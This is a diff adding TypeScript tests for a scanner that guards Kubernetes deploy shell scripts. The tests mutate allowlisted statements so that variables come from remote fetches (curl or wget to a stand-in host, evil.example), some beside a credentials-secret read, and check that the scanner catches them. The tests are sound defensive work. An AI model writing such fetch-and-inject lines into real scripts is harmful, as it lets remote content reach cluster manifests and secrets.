@@ -692,6 +692,104 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     }
   });
 
+  // ---- #1410 round 8: the allowlist pins where the interpolated variables come from --
+
+  const EVIL = 'https://evil.example/x';
+  const D = 'packages/scale-zero-pg/deploy/';
+  // Each mutation leaves the allowlisted STATEMENT byte-identical and only swaps
+  // what a variable it interpolates is assigned from.
+  const PRODUCER_SWAPS: Array<{ id: string; file: string; from: string; to: string }> = [
+    {
+      id: 'lsn-inject-objstore',
+      file: `${D}_verify-objstore.sh`,
+      from: 'STATIC_LSN="$(LRL)"',
+      to: `STATIC_LSN="$(curl -s ${EVIL})"`,
+    },
+    {
+      id: 'lsn-inject-objstore',
+      file: `${D}_verify-objstore.sh`,
+      from: 'STATIC_LSN="$(LRL)"',
+      to: `STATIC_LSN="$(wget -qO- ${EVIL})"`,
+    },
+    {
+      id: 'lsn-inject-objstore',
+      file: `${D}_verify-objstore.sh`,
+      from: 'STATIC_LSN="$(LRL)"',
+      to: `curl -s -o /tmp/lsn ${EVIL}\nSTATIC_LSN="$(cat /tmp/lsn)"`,
+    },
+    {
+      id: 'lsn-inject-objstore',
+      file: `${D}_verify-objstore.sh`,
+      from: 'SRC_NS=scale-zero-pg',
+      to: `SRC_NS="$(curl -s ${EVIL})"`,
+    },
+    {
+      id: 'lsn-inject-restore',
+      file: `${D}_verify-restore.sh`,
+      from: 'STATIC_LSN="$($KD exec sts/pageserver',
+      to: `STATIC_LSN="$(curl -s ${EVIL}; $KD exec sts/pageserver`,
+    },
+    {
+      id: 'lsn-inject-app-restore',
+      file: `${D}_verify-app-restore.sh`,
+      from: 'MODE_LSN="$(PS_TL_FIELD "$DRILL_NS" "$APPS_TENANT" "$VICTIM_TL" last_record_lsn)"',
+      to: `MODE_LSN="$(curl -s ${EVIL})"`,
+    },
+    {
+      id: 'ctl-seed-heredoc',
+      file: `${D}_restore-writable.sh`,
+      from: '  _u="$($KD get secret storage-s3-creds -o jsonpath=\'{.data.user}\' | base64 -d)"',
+      to: `  _ctl="$(curl -s ${EVIL})"\n  _u="$($KD get secret storage-s3-creds -o jsonpath='{.data.user}' | base64 -d)"`,
+    },
+  ];
+
+  it('round 8: every allowlist entry survives a producer swap ONLY if the swap is not a remote fetch', () => {
+    for (const e of STATEMENT_ALLOWLIST) {
+      expect({ id: e.id, swaps: PRODUCER_SWAPS.filter((x) => x.id === e.id).length > 0 }).toEqual({
+        id: e.id,
+        swaps: true,
+      });
+    }
+    for (const m of PRODUCER_SWAPS) {
+      const text = readTracked(m.file);
+      expect({ m: m.to, occurs: text.split(m.from).length - 1 >= 1 }).toEqual({
+        m: m.to,
+        occurs: true,
+      });
+      const mutated = text.split(m.from).join(m.to);
+      expect(mutated).not.toBe(text);
+      const offenders = scanFile(m.file, mutated);
+      // Caught by the entry's source pin specifically, not incidentally.
+      expect({
+        id: m.id,
+        to: m.to,
+        pinned: offenders.some((o) => o.includes(`allowlisted statement '${m.id}'`)),
+      }).toEqual({ id: m.id, to: m.to, pinned: true });
+    }
+  });
+
+  it('round 8: the unmutated tree still passes and every pinned source is observed (no stale pin)', () => {
+    const { allowHits } = scanRealTree();
+    for (const e of STATEMENT_ALLOWLIST) {
+      expect({ id: e.id, pinned: e.sources.length > 0 }).toEqual({ id: e.id, pinned: true });
+      for (const src of e.sources)
+        expect({ id: e.id, src, seen: (allowHits.get(`${e.id}::${src}`) ?? 0) > 0 }).toEqual({
+          id: e.id,
+          src,
+          seen: true,
+        });
+    }
+  });
+
+  it('round 8: a heredoc that dereferences `${!N}` while a variable holds fetched content is refused', () => {
+    const script = (body: string) =>
+      `${STRICT}X="$(curl -s ${EVIL})"\nN=X\ncat <<E | kubectl apply -f -\n${body}\nE\n`;
+    expect(unsafeApplies(script('${!N}')).length).toBeGreaterThan(0);
+    expect(unsafeApplies(script('$X')).length).toBeGreaterThan(0);
+    // With nothing fetched, an indirect expansion is not an offence.
+    expect(unsafeApplies(`${STRICT}N=HOME\ncat <<E | kubectl apply -f -\n\${!N}\nE\n`)).toEqual([]);
+  });
+
   // ---- #1410 round 5, finding 3: pinned versions fail fast, by name --------
 
   it('round 5: the szpg drill rejects a cert-manager / Knative version override, naming the pin, before any cluster work', () => {
